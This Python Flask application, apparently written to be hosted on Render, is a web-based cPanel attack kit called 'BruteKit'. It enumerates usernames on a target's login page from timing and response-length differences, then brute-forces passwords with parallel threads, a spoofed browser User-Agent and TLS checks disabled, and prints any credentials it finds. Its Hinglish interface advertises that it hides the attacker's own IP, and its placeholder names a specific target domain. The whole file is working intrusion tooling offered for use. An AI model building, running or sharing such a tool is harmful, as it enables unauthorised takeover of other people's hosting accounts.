#!/usr/bin/env python3
# language: Python3 | Flask web app | Render deployment
# Brute force + username enum via browser — runs on Render's IP

import os, time, threading, uuid, requests, urllib3
from flask import Flask, Response, request, render_template_string
from queue import Queue, Empty

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app  = Flask(__name__)
JOBS = {}   # job_id → {"queue": Queue, "done": bool}
BASE = os.path.dirname(os.path.abspath(__file__))

# ── HTML UI ──────────────────────────────────────────────────────
HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BruteKit — Web</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#0d0d0d;color:#e0e0e0;font-family:'Courier New',monospace;padding:20px}
  h1{color:#00e5ff;font-size:1.4rem;margin-bottom:4px;letter-spacing:2px}
  .sub{color:#555;font-size:.75rem;margin-bottom:24px}
  .card{background:#111;border:1px solid #222;border-radius:8px;padding:20px;margin-bottom:16px}
  label{color:#aaa;font-size:.8rem;display:block;margin-bottom:5px}
  input,select{width:100%;background:#1a1a1a;color:#fff;border:1px solid #333;
    border-radius:4px;padding:9px 12px;font-family:inherit;font-size:.9rem;margin-bottom:14px}
  input:focus,select:focus{outline:none;border-color:#00e5ff}
  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
  .modes{display:flex;flex-direction:column;gap:8px;margin-bottom:14px}
  .mode-opt{display:flex;align-items:center;gap:10px;padding:10px 14px;
    border:1px solid #2a2a2a;border-radius:4px;cursor:pointer;transition:.2s}
  .mode-opt:hover,.mode-opt.active{border-color:#00e5ff;background:#0a1a1a}
  .mode-opt input[type=radio]{width:auto;margin:0}
  .mode-opt span{color:#ccc;font-size:.85rem}
  .mode-opt .tag{font-size:.7rem;color:#00e5ff;margin-left:auto}
  button{width:100%;padding:12px;background:#00e5ff;color:#000;border:none;
    border-radius:4px;font-family:inherit;font-size:1rem;font-weight:bold;
    cursor:pointer;letter-spacing:1px;transition:.2s}
  button:hover{background:#00bcd4}
  button:disabled{background:#333;color:#666;cursor:not-allowed}
  #terminal{background:#000;border:1px solid #1a1a1a;border-radius:6px;
    padding:14px;height:420px;overflow-y:auto;font-size:.8rem;line-height:1.6;
    white-space:pre-wrap;word-break:break-all}
  #terminal .info{color:#00e5ff}
  #terminal .ok{color:#00e676}
  #terminal .fail{color:#555}
  #terminal .warn{color:#ffeb3b}
  #terminal .found{color:#69ff47;font-weight:bold;font-size:1rem}
  #terminal .err{color:#f44336}
  #status{margin-bottom:10px;font-size:.8rem;color:#555}
  .dot{display:inline-block;width:8px;height:8px;border-radius:50%;
    background:#333;margin-right:6px}
  .dot.running{background:#00e5ff;animation:pulse 1s infinite}
  .dot.done{background:#00e676}
  .dot.error{background:#f44336}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
</style>
</head>
<body>
<h1>◈ BRUTEKIT WEB</h1>
<p class="sub">Render server se chalta hai — tera IP safe</p>

<div class="card">
  <label>Target URL</label>
  <input type="text" id="url" placeholder="radhewins.buzz ya https://radhewins.buzz:2083" autocomplete="off">
  
  <label>Port</label>
  <select id="port">
    <option value="2083">2083 — cPanel HTTPS (default)</option>
    <option value="2082">2082 — cPanel HTTP</option>
    <option value="custom">Custom</option>
  </select>
  <input type="text" id="custom_port" placeholder="Custom port number" style="display:none;margin-top:-8px">

  <label>Mode</label>
  <div class="modes">
    <label class="mode-opt active" id="m1">
      <input type="radio" name="mode" value="1" checked>
      <span>Username Enum → phir Password Brute</span>
      <span class="tag">RECOMMENDED</span>
    </label>
    <label class="mode-opt" id="m2">
      <input type="radio" name="mode" value="2">
      <span>Seedha Brute Force (username.txt + password.txt)</span>
    </label>
    <label class="mode-opt" id="m3">
      <input type="radio" name="mode" value="3">
      <span>Sirf Username Enumeration</span>
    </label>
  </div>

  <div class="row">
    <div>
      <label>Threads</label>
      <input type="number" id="threads" value="2" min="1" max="10">
    </div>
    <div>
      <label>Delay (seconds)</label>
      <input type="number" id="delay" value="0.5" step="0.1" min="0">
    </div>
  </div>

  <button id="btn" onclick="startAttack()">▶ START</button>
</div>

<div id="status"><span class="dot" id="dot"></span><span id="status_text">Ready</span></div>
<div id="terminal">[SYSTEM] BruteKit ready. URL daal ke START karo.\n</div>

<script>
let evtSrc = null;

document.getElementById('port').addEventListener('change', function(){
  document.getElementById('custom_port').style.display =
    this.value === 'custom' ? 'block' : 'none';
});

document.querySelectorAll('.mode-opt input').forEach(r => {
  r.addEventListener('change', () => {
    document.querySelectorAll('.mode-opt').forEach(m => m.classList.remove('active'));
    r.closest('.mode-opt').classList.add('active');
  });
});

function log(msg, cls=''){
  const t = document.getElementById('terminal');
  const d = document.createElement('div');
  if(cls) d.className = cls;
  d.textContent = msg;
  t.appendChild(d);
  t.scrollTop = t.scrollHeight;
}

function setStatus(state, text){
  const dot = document.getElementById('dot');
  dot.className = 'dot ' + state;
  document.getElementById('status_text').textContent = text;
}

function startAttack(){
  const url     = document.getElementById('url').value.trim();
  const portSel = document.getElementById('port').value;
  const port    = portSel === 'custom'
                  ? document.getElementById('custom_port').value.trim()
                  : portSel;
  const mode    = document.querySelector('input[name=mode]:checked').value;
  const threads = document.getElementById('threads').value;
  const delay   = document.getElementById('delay').value;

  if(!url){ log('[ERROR] URL daalo pehle!', 'err'); return; }

  if(evtSrc){ evtSrc.close(); }
  document.getElementById('terminal').innerHTML = '';
  document.getElementById('btn').disabled = true;
  setStatus('running', 'Running...');

  log('[*] Attack shuru ho raha hai...', 'info');

  const params = new URLSearchParams({url, port, mode, threads, delay});

  fetch('/start', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: params
  })
  .then(r => r.json())
  .then(data => {
    if(!data.job_id){ log('[ERROR] Server error', 'err'); return; }
    
    evtSrc = new EventSource('/stream/' + data.job_id);
    
    evtSrc.onmessage = function(e){
      const msg = e.data;
      let cls = 'fail';
      if(msg.startsWith('[FOUND]'))    cls = 'found';
      else if(msg.startsWith('[+]'))   cls = 'ok';
      else if(msg.startsWith('[*]'))   cls = 'info';
      else if(msg.startsWith('[!]'))   cls = 'warn';
      else if(msg.startsWith('[x]'))   cls = 'err';
      else if(msg.startsWith('==='))   cls = 'info';
      log(msg, cls);
    };

    evtSrc.addEventListener('done', function(){
      evtSrc.close();
      document.getElementById('btn').disabled = false;
      setStatus('done', 'Finished');
    });

    evtSrc.onerror = function(){
      evtSrc.close();
      document.getElementById('btn').disabled = false;
      setStatus('error', 'Connection lost');
    };
  });
}
</script>
</body>
</html>"""

# ── Load wordlists ───────────────────────────────────────────────
def load_list(filename):
    path = os.path.join(BASE, filename)
    if not os.path.exists(path):
        return []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [l.strip() for l in f if l.strip()]

# ── Send to queue ────────────────────────────────────────────────
def emit(q, msg):
    q.put(msg)

# ── Username Enumeration ─────────────────────────────────────────
def enumerate_users(host, port, scheme, usernames, q, delay):
    emit(q, "[*] USERNAME ENUMERATION START")
    emit(q, f"[*] Target: {scheme}://{host}:{port}")
    emit(q, "=" * 50)

    login_url = f"{scheme}://{host}:{port}/login/"
    JUNK      = "XXXINVALID_PASS_999XXX"
    valid     = []

    # Baseline
    baseline_len  = 0
    baseline_time = 0
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})

    try:
        t0 = time.time()
        rb = session.post(login_url,
            data={"user": "zzz_invalid_zzz", "pass": JUNK, "goto_uri": "/"},
            verify=False, timeout=12, allow_redirects=False)
        baseline_time = (time.time() - t0) * 1000
        baseline_len  = len(rb.text)
        emit(q, f"[*] Baseline — time:{baseline_time:.0f}ms  len:{baseline_len}")
        emit(q, "")
    except Exception as e:
        emit(q, f"[!] Baseline error: {e}")

    for i, user in enumerate(usernames):
        try:
            t0 = time.time()
            r  = session.post(login_url,
                data={"user": user, "pass": JUNK, "goto_uri": "/"},
                verify=False, timeout=12, allow_redirects=False)
            elapsed  = (time.time() - t0) * 1000
            resp_len = len(r.text)
            time_diff = elapsed - baseline_time
            len_diff  = abs(resp_len - baseline_len)

            is_valid = False
            reason   = ""

            if time_diff > 300:
                is_valid = True
                reason   = f"SLOW +{time_diff:.0f}ms"
            if len_diff > 40:
                is_valid = True
                reason   = reason + f" LEN_DIFF +{len_diff}" if reason else f"LEN_DIFF +{len_diff}"

            if is_valid:
                valid.append(user)
                emit(q, f"[+] VALID? → {user}  ({reason})")
            else:
                emit(q, f"[-] {user:<20} {elapsed:>6.0f}ms  len={resp_len}")

        except Exception as e:
            emit(q, f"[!] {user} — {e}")

        time.sleep(delay)

    emit(q, "")
    emit(q, f"[*] Enum done. Possible valid: {len(valid)}")
    for v in valid:
        emit(q, f"[+]   → {v}")
    emit(q, "")
    return valid if valid else usernames  # fallback: sab try karo

# ── Brute Force ──────────────────────────────────────────────────
def brute_force(host, port, scheme, usernames, passwords, q, threads_n, delay):
    emit(q, "[*] BRUTE FORCE START")
    emit(q, f"[*] Users: {len(usernames)}  Passwords: {len(passwords)}")
    emit(q, f"[*] Total combos: {len(usernames) * len(passwords)}")
    emit(q, "=" * 50)

    login_url   = f"{scheme}://{host}:{port}/login/"
    found_event = threading.Event()
    found_creds = []
    lock        = threading.Lock()
    tried       = [0]
    total       = len(usernames) * len(passwords)

    combo_q = Queue()
    for u in usernames:
        for p in passwords:
            combo_q.put((u, p))

    def worker():
        s = requests.Session()
        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})

        while not found_event.is_set():
            try:
                user, passwd = combo_q.get(timeout=1)
            except Empty:
                break
            try:
                r = s.post(login_url,
                    data={"user": user, "pass": passwd, "goto_uri": "/"},
                    verify=False, timeout=12, allow_redirects=False)
                hit = (300 <= r.status_code < 400)
            except Exception as e:
                with lock:
                    tried[0] += 1
                    emit(q, f"[!] {user}:{passwd} — {e}")
                combo_q.task_done()
                time.sleep(2)
                continue

            with lock:
                tried[0] += 1
                pct = int((tried[0] / total) * 100)
                if hit:
                    found_event.set()
                    found_creds.append((user, passwd))
                    emit(q, "=" * 50)
                    emit(q, "[FOUND] CREDENTIALS MILGAYE!")
                    emit(q, f"[FOUND] Username : {user}")
                    emit(q, f"[FOUND] Password : {passwd}")
                    emit(q, f"[FOUND] Login    : {scheme}://{host}:{port}/login/?user={user}&pass={passwd}")
                    emit(q, "=" * 50)
                else:
                    emit(q, f"[-] [{tried[0]}/{total}] {pct}%  {user}:{passwd}  HTTP {r.status_code}")

            combo_q.task_done()
            if delay > 0:
                time.sleep(delay)

    ts = []
    for _ in range(threads_n):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ts.append(t)
    for t in ts:
        t.join()

    if not found_creds:
        emit(q, "[x] Credentials nahi mile. Wordlist expand karo.")

    return found_creds

# ── Background job runner ────────────────────────────────────────
def run_job(job_id, url, port, scheme, mode, threads_n, delay):
    q = JOBS[job_id]["queue"]

    try:
        host = url.replace("https://","").replace("http://","").split(":")[0].rstrip("/")
        emit(q, f"[*] Host: {host}  Port: {port}  Scheme: {scheme}")
        emit(q, f"[*] Mode: {mode}  Threads: {threads_n}  Delay: {delay}s")
        emit(q, "")

        usernames = load_list("username.txt")
        passwords = load_list("password.txt")

        if not usernames:
            emit(q, "[!] username.txt empty hai — default usernames use kar raha hoon")
            usernames = ["admin","administrator","root","cpanel","webmaster"]
        if not passwords:
            emit(q, "[!] password.txt empty hai — default passwords use kar raha hoon")
            passwords = ["admin","admin123","123456","password","root123"]

        if mode == "1":
            # Enum first, then brute
            valid = enumerate_users(host, port, scheme, usernames, q, delay)
            brute_force(host, port, scheme, valid, passwords, q, threads_n, delay)

        elif mode == "2":
            # Direct brute
            brute_force(host, port, scheme, usernames, passwords, q, threads_n, delay)

        elif mode == "3":
            # Sirf enum
            enumerate_users(host, port, scheme, usernames, q, delay)

    except Exception as e:
        emit(q, f"[!] Job error: {e}")
    finally:
        JOBS[job_id]["done"] = True
        q.put(None)  # sentinel

# ── Flask Routes ─────────────────────────────────────────────────
@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/start", methods=["POST"])
def start():
    url      = request.form.get("url", "").strip()
    port_raw = request.form.get("port", "2083").strip()
    mode     = request.form.get("mode", "1")
    threads  = int(request.form.get("threads", 2))
    delay    = float(request.form.get("delay", 0.5))

    try:
        port = int(port_raw)
    except:
        port = 2083

    scheme = "http" if port == 2082 else "https"

    job_id = str(uuid.uuid4())[:8]
    JOBS[job_id] = {"queue": Queue(), "done": False}

    t = threading.Thread(
        target=run_job,
        args=(job_id, url, port, scheme, mode, threads, delay),
        daemon=True
    )
    t.start()

    return {"job_id": job_id}

@app.route("/stream/<job_id>")
def stream(job_id):
    if job_id not in JOBS:
        return "Job not found", 404

    def generate():
        q = JOBS[job_id]["queue"]
        while True:
            try:
                msg = q.get(timeout=60)
                if msg is None:
                    yield "event: done\ndata: done\n\n"
                    break
                # Escape newlines for SSE
                safe = msg.replace("\n", " ")
                yield f"data: {safe}\n\n"
            except Empty:
                yield ": ping\n\n"  # keep-alive

    return Response(
        generate(),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        }
    )

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
